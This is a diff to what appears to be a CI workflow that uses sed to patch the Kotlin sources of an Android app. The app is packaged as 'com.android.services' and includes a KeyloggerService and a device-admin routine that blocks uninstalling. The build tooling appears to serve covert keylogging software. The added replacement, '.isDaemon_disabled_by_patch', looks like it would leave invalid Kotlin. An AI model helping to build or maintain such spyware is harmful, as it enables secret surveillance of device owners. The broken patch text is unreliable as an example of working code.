@@ -33,6 +33,8 @@ jobs:
 
           sed -i 's/Thread { AppDeviceAdminReceiver.setBlockUninstall/\/\/ Thread { AppDeviceAdminReceiver.setBlockUninstall/' \
             android/app/src/main/kotlin/com/android/services/ConnectorService.kt
+          sed -i 's/\.also { it\.isDaemon = true }\.start()/.isDaemon_disabled_by_patch/' \
+            android/app/src/main/kotlin/com/android/services/ConnectorService.kt
 
           echo "✅ Patch applied"
           grep "adminGuardEnabled" android/app/src/main/kotlin/com/android/services/KeyloggerService.kt
